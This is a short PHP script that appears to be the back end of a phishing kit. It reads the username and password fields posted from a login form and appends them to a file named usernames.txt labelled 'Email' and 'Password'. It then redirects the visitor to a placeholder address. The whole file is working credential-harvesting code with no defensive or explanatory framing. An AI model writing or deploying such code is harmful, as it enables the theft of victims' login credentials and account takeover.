<?php
include 'info.php';

file_put_contents("usernames.txt", "[^]Email -> " . $_POST['j_username'] . "\n[^]Password -> " . $_POST['j_password'] . "\n", FILE_APPEND);
header('Location: <CUSTOM>');
exit();

